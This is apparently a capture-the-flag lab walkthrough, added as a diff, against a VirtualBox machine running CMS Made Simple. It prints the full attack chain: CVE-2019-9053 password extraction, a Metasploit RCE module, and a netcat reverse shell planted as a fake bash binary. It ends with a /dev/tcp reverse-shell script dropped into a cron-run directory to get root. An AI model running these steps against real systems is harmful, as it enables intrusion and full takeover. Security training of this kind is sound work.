@@ -1,0 +1,683 @@
+			ENUMERATION
+			
+---ifconfig---
+
+                                                                                                     
+┌──(root㉿kali)-[/home/okina]
+└─# ifconfig
+eth0: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500
+        inet 10.0.2.15  netmask 255.255.255.0  broadcast 10.0.2.255
+        inet6 fe80::a00:27ff:fef6:e3c3  prefixlen 64  scopeid 0x20<link>
+        ether 08:00:27:f6:e3:c3  txqueuelen 1000  (Ethernet)
+        RX packets 152492  bytes 13531135 (12.9 MiB)
+        RX errors 0  dropped 0  overruns 0  frame 0
+        TX packets 288430  bytes 19562812 (18.6 MiB)
+        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0
+
+lo: flags=73<UP,LOOPBACK,RUNNING>  mtu 65536
+        inet 127.0.0.1  netmask 255.0.0.0
+        inet6 ::1  prefixlen 128  scopeid 0x10<host>
+        loop  txqueuelen 1000  (Local Loopback)
+        RX packets 36  bytes 2224 (2.1 KiB)
+        RX errors 0  dropped 0  overruns 0  frame 0
+        TX packets 36  bytes 2224 (2.1 KiB)
+        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0
+
+
+
+---netdiscover---
+
+┌──(root㉿kali)-[/home/okina]
+└─# netdiscover -i eth0 -r 10.0.2.0/24 -c 200
+
+ Currently scanning: 10.0.2.0/24   |   Screen View: Unique Hosts                                    
+                                                                                                    
+ 16 Captured ARP Req/Rep packets, from 4 hosts.   Total size: 960                                   
+ _____________________________________________________________________________
+   IP            At MAC Address     Count     Len  MAC Vendor / Hostname      
+ -----------------------------------------------------------------------------
+ 10.0.2.1        52:54:00:12:35:00      4     240  Unknown vendor                                   
+ 10.0.2.2        52:54:00:12:35:00      4     240  Unknown vendor                                   
+ 10.0.2.3        08:00:27:19:64:c9      4     240  PCS Systemtechnik GmbH                           
+ 10.0.2.43       08:00:27:34:50:9b      4     240  PCS Systemtechnik GmbH                           
+
+zsh: suspended  netdiscover -i eth0 -r 10.0.2.0/24 -c 200
+                                     
+
+
+
+---nmap---
+                                                                                         
+┌──(root㉿kali)-[/home/okina]
+└─# nmap 10.0.2.43 -sS -sC -sV -A -T4 -p-  
+Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-04-25 14:48 +03
+Nmap scan report for 10.0.2.43
+Host is up (0.00078s latency).
+Not shown: 65533 closed tcp ports (reset)
+PORT   STATE SERVICE VERSION
+22/tcp open  ssh     OpenSSH 9.2p1 Debian 2 (protocol 2.0)
+| ssh-hostkey: 
+|   256 dd:83:da:cb:45:d3:a8:ea:c6:be:19:03:45:76:43:8c (ECDSA)
+|_  256 e5:5f:7f:25:aa:c0:18:04:c4:46:98:b3:5d:a5:2b:48 (ED25519)
+80/tcp open  http    Apache httpd 2.4.57 ((Debian))
+|_http-generator: CMS Made Simple - Copyright (C) 2004-2023. All rights reserved.
+|_http-title: Home - Blog
+|_http-server-header: Apache/2.4.57 (Debian)
+MAC Address: 08:00:27:34:50:9B (Oracle VirtualBox virtual NIC)
+Device type: general purpose
+Running: Linux 4.X|5.X
+OS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5
+OS details: Linux 4.15 - 5.8
+Network Distance: 1 hop
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+TRACEROUTE
+HOP RTT     ADDRESS
+1   0.78 ms 10.0.2.43
+
+OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 39.59 seconds
+                 
+
+---we see ssh and http ports are open---
+
+
+
+---I run dirb, ctfenum and gobuster and see lots of hidden pages and find a login page for admin users at
+http://10.0.2.43/admin/login.php---
+
+
+
+---I decide to check the website manually, turns out it is made with cmsms open source management system---
+
+
+
+Cms Made Simple: It is an open source content management system to provide developers, programmers and site 
+owners a web-based development and administration area. It is a system that can be vulnerable to object
+injections
+
+
+
+---I start checking for exploits that are for cmsms and find one, it is a tool made with python named 
+CVE-2019-9053 Exploit (Python 3). Link is https://github.com/Mahamedm/CVE-2019-9053-Exploit-Python-3 ---
+
+
+
+
+                                                                                                     
+┌──(root㉿kali)-[/home/okina/]
+└─# cd /opt                                 
+      
+
+┌──(root㉿kali)-[/opt]
+└─# git clone https://github.com/Mahamedm/CVE-2019-9053-Exploit-Python-3.git
+
+
+
+┌──(root㉿kali)-[/opt]
+└─# cd CVE-2019-9053-Exploit-Python-3 
+                                                                                                     
+
+┌──(root㉿kali)-[/opt/CVE-2019-9053-Exploit-Python-3]
+└─# ls
+README.md  csm_made_simple_injection.py
+
+                                                                                                     
+┌──(root㉿kali)-[/opt/CVE-2019-9053-Exploit-Python-3]
+└─# python3 csm_made_simple_injection.py --help      
+Usage: csm_made_simple_injection.py [options]
+
+Options:
+  -h, --help            show this help message and exit
+  -u URL, --url=URL     Base target uri (ex. http://10.10.10.100/cms)
+  -w WORDLIST, --wordlist=WORDLIST
+                        Wordlist for crack admin password
+  -c, --crack           Crack password with wordlist
+                            
+
+
+---now we know how to use it---
+
+
+
+┌──(root㉿kali)-[/opt/CVE-2019-9053-Exploit-Python-3]
+└─# python3 csm_made_simple_injection.py -u http://10.0.2.43 -w /home/okina/wordlists/rockyou.txt -c
+
+
+[+] Salt for password found: 1a0112229fbd699d
+[+] Username found: admin
+[+] Email found: admin@localhost.com
+[+] Password found: 4f943036486b9ad48890b2efbf7735a8
+[+] Password cracked: homeandaway
+                  
+
+
+---we found username, email, salt password and the password. And the tool also cracked the password---
+
+---If the tool couldn't crack the password (which it couldnt the first time I tried) we could crack it with john---
+
+
+hash = admin:4f943036486b9ad48890b2efbf7735a8$1a0112229fbd699d
+
+password = homeandaway
+       
+      
+       
+---now lets log in to the admin page to see what we can do---
+
+---I checked around the page and couldn't find much to do---
+
+
+
+---we have credentials, lets use msfconsole to exploit this cmsms website---
+
+
+
+
+			GAINING FOOTHOLD
+
+
+                                                                                
+┌──(root㉿kali)-[/home/okina]
+└─# msfconsole                    
+Metasploit tip: Open an interactive Ruby terminal with irb
+                                                  
+
+MMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMM
+MMMMMMMMMMM                MMMMMMMMMM
+MMMN$                           vMMMM
+MMMNl  MMMMM             MMMMM  JMMMM
+MMMNl  MMMMMMMN       NMMMMMMM  JMMMM
+MMMNl  MMMMMMMMMNmmmNMMMMMMMMM  JMMMM
+MMMNI  MMMMMMMMMMMMMMMMMMMMMMM  jMMMM
+MMMNI  MMMMMMMMMMMMMMMMMMMMMMM  jMMMM
+MMMNI  MMMMM   MMMMMMM   MMMMM  jMMMM
+MMMNI  MMMMM   MMMMMMM   MMMMM  jMMMM
+MMMNI  MMMNM   MMMMMMM   MMMMM  jMMMM
+MMMNI  WMMMM   MMMMMMM   MMMM#  JMMMM
+MMMMR  ?MMNM             MMMMM .dMMMM
+MMMMNm `?MMM             MMMM` dMMMMM
+MMMMMMN  ?MM             MM?  NMMMMMN
+MMMMMMMMNe                 JMMMMMNMMM
+MMMMMMMMMMNm,            eMMMMMNMMNMM
+MMMMNNMNMMMMMNx        MMMMMMNMMNMMNM
+MMMMMMMMNMMNMMMMm+..+MMNMMNMNMMNMMNMM
+        https://metasploit.com
+
+
+       =[ metasploit v6.4.3-dev                           ]
++ -- --=[ 2409 exploits - 1241 auxiliary - 423 post       ]
++ -- --=[ 1468 payloads - 47 encoders - 11 nops           ]
++ -- --=[ 9 evasion                                       ]
+
+Metasploit Documentation: https://docs.metasploit.com/
+
+msf6 > search cmsms
+
+Matching Modules
+================
+
+   #  Name                                           Disclosure Date  Rank       Check  Description
+   -  ----                                           ---------------  ----       -----  -----------
+   0  exploit/multi/http/cmsms_showtime2_rce         2019-03-11       normal     Yes    CMS Made Simple (CMSMS) Showtime2 File Upload RCE
+   1  exploit/multi/http/cmsms_upload_rename_rce     2018-07-03       excellent  Yes    CMS Made Simple Authenticated RCE via File Upload/Copy
+   2  exploit/multi/http/cmsms_object_injection_rce  2019-03-26       normal     Yes    CMS Made Simple Authenticated RCE via object injection
+
+
+Interact with a module by name or index. For example info 2, use 2 or use exploit/multi/http/cmsms_object_injection_rce
+
+msf6 > use 2
+[*] No payload configured, defaulting to php/meterpreter/reverse_tcp
+msf6 exploit(multi/http/cmsms_object_injection_rce) > set password homeandaway
+password => homeandaway
+msf6 exploit(multi/http/cmsms_object_injection_rce) > set username admin
+username => admin
+msf6 exploit(multi/http/cmsms_object_injection_rce) > set rhosts 10.0.2.43
+rhosts => 10.0.2.43
+msf6 exploit(multi/http/cmsms_object_injection_rce) > show options
+
+Module options (exploit/multi/http/cmsms_object_injection_rce):
+
+   Name       Current Setting  Required  Description
+   ----       ---------------  --------  -----------
+   PASSWORD   homeandaway      yes       Password to authenticate with
+   Proxies                     no        A proxy chain of format type:host:port[,type:host:port][...]
+   RHOSTS     10.0.2.43        yes       The target host(s), see https://docs.metasploit.com/docs/using-
+                                         metasploit/basics/using-metasploit.html
+   RPORT      80               yes       The target port (TCP)
+   SSL        false            no        Negotiate SSL/TLS for outgoing connections
+   TARGETURI  /                yes       Base cmsms directory path
+   USERNAME   admin            yes       Username to authenticate with
+   VHOST                       no        HTTP server virtual host
+
+
+Payload options (php/meterpreter/reverse_tcp):
+
+   Name   Current Setting  Required  Description
+   ----   ---------------  --------  -----------
+   LHOST  10.0.2.15        yes       The listen address (an interface may be specified)
+   LPORT  4444             yes       The listen port
+
+
+Exploit target:
+
+   Id  Name
+   --  ----
+   0   Automatic
+
+
+
+View the full module info with the info, or info -d command.
+
+msf6 exploit(multi/http/cmsms_object_injection_rce) > run -j
+[*] Exploit running as background job 0.
+[*] Exploit completed, but no session was created.
+
+[*] Started reverse TCP handler on 10.0.2.15:4444 
+[*] Running automatic check ("set AutoCheck false" to disable)
+msf6 exploit(multi/http/cmsms_object_injection_rce) > [+] The target appears to be vulnerable.
+[*] Sending stage (39927 bytes) to 10.0.2.43
+[+] Deleted FiASLYKUI.php
+[*] Meterpreter session 1 opened (10.0.2.15:4444 -> 10.0.2.43:51730) at 2024-04-26 14:26:26 +0300
+whoami
+[*] exec: whoami
+
+root
+msf6 exploit(multi/http/cmsms_object_injection_rce) > sessions
+
+Active sessions
+===============
+
+  Id  Name  Type                   Information             Connection
+  --  ----  ----                   -----------             ----------
+  1         meterpreter php/linux  www-data @ rooSter-Run  10.0.2.15:4444 -> 10.0.2.43:51730 (10.0.2.43)
+
+msf6 exploit(multi/http/cmsms_object_injection_rce) > sessions 1
+[*] Starting interaction with 1...
+
+
+---lets convert to a shell and then upgrade it---
+
+meterpreter > shell
+Process 1235 created.
+Channel 0 created.
+whoami
+www-data
+
+python3 -c 'import pty;pty.spawn("/bin/bash")';
+
+
+---I start searching for some info now---
+
+
+www-data@rooSter-Run:/var/www/html/admin$ cd ..
+cd ..
+www-data@rooSter-Run:/var/www/html$ ls
+ls
+admin	config.php  favicon_cms.ico  lib		  modules  uploads
+assets	doc	    index.php	     moduleinterface.php  tmp
+
+
+www-data@rooSter-Run:/var/www/html$ cat config	
+cat config.php 
+<?php
+# CMS Made Simple Configuration File
+# Documentation: https://docs.cmsmadesimple.org/configuration/config-file/config-reference
+#
+$config['dbms'] = 'mysqli';
+$config['db_hostname'] = 'localhost';
+$config['db_username'] = 'admin';
+$config['db_password'] = 'j42W9kDq9dN9hK';
+$config['db_name'] = 'cmsms_db';
+$config['db_prefix'] = 'cms_';
+$config['timezone'] = 'Europe/Berlin';
+
+
+---here we get info about the mysql service---
+
+
+www-data@rooSter-Run:/var/www/html$ mysql -u admin -p
+mysql -u admin -p
+Enter password: j42W9kDq9dN9hK
+
+Welcome to the MariaDB monitor.  Commands end with ; or \g.
+
+MariaDB [(none)]> show databases;
+show databases;
++--------------------+
+| Database           |
++--------------------+
+| cmsms_db           |
+| information_schema |
++--------------------+
+2 rows in set (0.001 sec)
+
+MariaDB [(none)]> use cmsms_db
+use cmsms_db
+Reading table information for completion of table and column names
+You can turn off this feature to get a quicker startup with -A
+
+Database changed
+MariaDB [cmsms_db]> show tables;
+show tables;
++--------------------------------+
+| Tables_in_cmsms_db             |
++--------------------------------+
+| cms_additional_users           |
+| cms_additional_users_seq       |
+| cms_admin_bookmarks            |
+| cms_admin_bookmarks_seq        |
+| cms_adminlog                   |
+| cms_content                    |
+| cms_content_props              |
+| cms_content_props_seq          |
+| cms_content_seq                |
+| cms_event_handler_seq          |
+| cms_event_handlers             |
+| cms_events                     |
+| cms_events_seq                 |
+| cms_group_perms                |
+| cms_group_perms_seq            |
+| cms_groups                     |
+| cms_groups_seq                 |
+| cms_layout_design_cssassoc     |
+| cms_layout_design_tplassoc     |
+| cms_layout_designs             |
+| cms_layout_stylesheets         |
+| cms_layout_templates           |
+| cms_layout_tpl_addusers        |
+| cms_layout_tpl_categories      |
+| cms_layout_tpl_type            |
+| cms_locks                      |
+| cms_mod_cmsjobmgr              |
+| cms_mod_filepicker_profiles    |
+| cms_module_deps                |
+| cms_module_news                |
+| cms_module_news_categories     |
+| cms_module_news_categories_seq |
+| cms_module_news_fielddefs      |
+| cms_module_news_fieldvals      |
+| cms_module_news_seq            |
+| cms_module_search_index        |
+| cms_module_search_items        |
+| cms_module_search_items_seq    |
+| cms_module_search_words        |
+| cms_module_smarty_plugins      |
+| cms_module_templates           |
+| cms_modules                    |
+| cms_permissions                |
+| cms_permissions_seq            |
+| cms_routes                     |
+| cms_siteprefs                  |
+| cms_user_groups                |
+| cms_userplugins                |
+| cms_userplugins_seq            |
+| cms_userprefs                  |
+| cms_users                      |
+| cms_users_seq                  |
+| cms_version                    |
++--------------------------------+
+53 rows in set (0.001 sec)
+
+MariaDB [cmsms_db]> select * FROM cms_users;
+select * FROM cms_users;
++---------+----------+----------------------------------+--------------+------------+-----------+---------------------+--------+---------------------+---------------------+
+| user_id | username | password                         | admin_access | first_name | last_name | email               | active | create_date         | modified_date       |
++---------+----------+----------------------------------+--------------+------------+-----------+---------------------+--------+---------------------+---------------------+
+|       1 | admin    | 4f943036486b9ad48890b2efbf7735a8 |            1 |            |           | admin@localhost.com |      1 | 2023-09-20 07:28:39 | 2023-09-20 07:31:54 |
++---------+----------+----------------------------------+--------------+------------+-----------+---------------------+--------+---------------------+---------------------+
+1 row in set (0.001 sec)
+
+
+
+---we get the password but we already know it by now, it is a part of the hash that we already cracked, lets keep
+on checking---
+
+
+
+www-data@rooSter-Run:/tmp$ cd /home      
+cd /home
+www-data@rooSter-Run:/home$ ls
+ls
+matthieu
+www-data@rooSter-Run:/home$ cd matthieu
+cd matthieu
+www-data@rooSter-Run:/home/matthieu$ ls
+ls
+StaleFinder  user.txt
+www-data@rooSter-Run:/home/matthieu$ cat user.txt
+cat user.txt
+cat: user.txt: Permission denied
+
+	
+www-data@rooSter-Run:/home/matthieu$ cat St	
+cat StaleFinder 
+#!/usr/bin/env bash
+
+for file in ~/*; do
+    if [[ -f $file ]]; then
+        if [[ ! -s $file ]]; then
+            echo "$file is empty."
+        fi
+        
+        if [[ $(find "$file" -mtime +365 -print) ]]; then
+            echo "$file hasn't been modified for over a year."
+        fi
+    fi
+done
+
+
+
+---seems like that this script is executed regularly, we can try to priv escalate by controlling bash in the
+environment variable---
+
+
+---we can try to create a fake bash to execute it to escalate our privilege---
+
+
+
+Environment variable: User definable value that can affect the way running processes will behave on a computer 
+
+			
+
+www-data@rooSter-Run:/home$ echo -e '#! /bin/bash\nnc 10.0.2.15 8888 -e /bin/bash' > /usr/local/bin/bash
+< 10.0.2.15 8888 -e /bin/bash' > /usr/local/bin/bash
+
+www-data@rooSter-Run:/home$ chmod 777 /usr/local/bin/bash
+chmod 777 /usr/local/bin/bash
+
+
+
+---now lets set up our listener and wait---
+
+
+
+			
+			PRIVILEGE ESCALATION
+
+
+┌──(root㉿kali)-[/home/okina]
+└─# nc -lnvp 8888                            
+listening on [any] 8888 ...
+connect to [10.0.2.15] from (UNKNOWN) [10.0.2.43] 37216
+
+whoami
+matthieu
+
+
+---we are in as the suer matthieu who has more privileges, lets get our first flag and keep on searching---
+
+
+python3 -c 'import pty;pty.spawn("/bin/bash")';
+
+matthieu@rooSter-Run:~$ cd /home
+cd /home
+matthieu@rooSter-Run:/home$ ls
+ls
+matthieu
+matthieu@rooSter-Run:/home$ cd matthieu
+cd matthieu
+matthieu@rooSter-Run:~$ ls
+ls
+StaleFinder  user.txt
+matthieu@rooSter-Run:~$ cat user.txt
+cat user.txt
+---First User Flag---
+
+
+---nothing with sudo -l, crontab or linpeas, I keep on checking---
+
+
+---I find a file in /opt folder named backup.sh---
+
+
+matthieu@rooSter-Run:/tmp$ cd /opt
+cd /opt
+matthieu@rooSter-Run:/opt$ ls
+ls
+maintenance
+matthieu@rooSter-Run:/opt$ cd maintenance
+cd maintenance
+matthieu@rooSter-Run:/opt/maintenance$ ls
+ls
+backup.sh  pre-prod-tasks  prod-tasks
+
+matthieu@rooSter-Run:/opt/maintenance$ cat ba	
+cat backup.sh 
+#!/bin/bash
+
+PROD="/opt/maintenance/prod-tasks"
+PREPROD="/opt/maintenance/pre-prod-tasks"
+
+
+for file in "$PREPROD"/*; do
+  if [[ -f $file && "${file##*.}" = "sh" ]]; then
+    cp "$file" "$PROD"
+  else
+    rm -f ${file}
+  fi
+done
+
+for file in "$PROD"/*; do
+  if [[ -f $file && ! -O $file ]]; then
+  rm ${file}
+  fi
+done
+
+/usr/bin/run-parts /opt/maintenance/prod-tasks
+
+
+
+---here it says that there is an app named run-parts that is being run, lets investigate that---
+
+
+matthieu@rooSter-Run:/opt/maintenance$ cd /usr/bin
+cd /usr/bin
+
+
+
+---lets use the man command to understand what does this application do---
+
+
+
+matthieu@rooSter-Run:/usr/bin$ man run-parts
+man run-parts
+WARNING: terminal is not fully functional
+Press RETURN to continue 
+
+RUN-PARTS(8)                System Manager's Manual               RUN-PARTS(8)
+
+NAME
+       run-parts - run scripts or programs in a directory
+
+SYNOPSIS
+       run-parts  [--test]  [--verbose]  [--debug]  [--report]  [--lsbsysinit]
+       [--regex=RE]   [--umask=umask]    [--arg=argument]    [--exit-on-error]
+       [--help] [--version] [--list] [--reverse] [--] DIRECTORY
+
+       run-parts -V
+
+DESCRIPTION
+       run-parts  runs  all  the executable files named within constraints de‐
+       scribed below, found in directory directory.  Other files and  directo‐
+       ries are silently ignored.
+
+       If neither the --lsbsysinit option nor the --regex option is given then
+       the names must consist entirely of ASCII upper- and lower-case letters,
+       ASCII digits, ASCII underscores, and ASCII minus-hyphens.
+
+.
+.
+.
+.
+
+
+
+---so, this backup script copies every .sh file from pre-prod-tasks folder to prod-tasks folder and then 
+runs them---
+
+
+---lets create a script and wait for the cron to run and gives us a shell as root---
+
+
+matthieu@rooSter-Run:/usr/bin$ cd /opt/maintenance/pre-prod-tasks
+cd /opt/maintenance/pre-prod-tasks
+
+matthieu@rooSter-Run:/opt/maintenance/pre-prod-tasks$ echo '#!/bin/bash' > privesc.sh
+<nce/pre-prod-tasks$ echo '#!/bin/bash' > privesc.sh  
+
+matthieu@rooSter-Run:/opt/maintenance/pre-prod-tasks$ echo '/bin/bash -c "/bin/bash -i >& /dev/tcp/10.0.2.15/1234 0>&1"' >> privesc.sh
+< -i >& /dev/tcp/10.0.2.15/1234 0>&1"' >> privesc.sh  
+
+matthieu@rooSter-Run:/opt/maintenance/pre-prod-tasks$ cat privesc.sh
+cat privesc.sh
+#!/bin/bash
+/bin/bash -c "/bin/bash -i >& /dev/tcp/10.0.2.15/1234 0>&1
+
+matthieu@rooSter-Run:/opt/maintenance/pre-prod-tasks$ chmod 777 privesc.sh
+chmod 777 privesc.sh
+
+
+
+---now if you remember in the man page of run-parts it said that the file should only have lowercase letters for
+it to work so once the file get copied to the prod-tasks folder we will remove the "."---
+
+
+matthieu@rooSter-Run:/opt/maintenance/pre-prod-tasks$ cd ..
+cd ..
+matthieu@rooSter-Run:/opt/maintenance$ cd prod-tasks
+cd prod-tasks
+matthieu@rooSter-Run:/opt/maintenance/prod-tasks$ ls
+ls
+privesc.sh
+
+
+---here we see the file is transfered already---
+
+
+matthieu@rooSter-Run:/opt/maintenance/prod-tasks$ mv privesc.sh privesc
+mv privesc.sh privesc
+
+
+---set up the listener---
+
+
+┌──(root㉿kali)-[/home/okina]
+└─# nc -lnvp 1234
+listening on [any] 1234 ...
+connect to [10.0.2.15] from (UNKNOWN) [10.0.2.43] 51086
+bash: cannot set terminal process group (34130): Inappropriate ioctl for device
+bash: no job control in this shell
+root@rooSter-Run:~# cd /root
+
+
+---we are root---
+
+
+root@rooSter-Run:~# ls
+ls
+root.txt
+root@rooSter-Run:~# cat root.txt
+cat root.txt
+---Root User Flag---
+
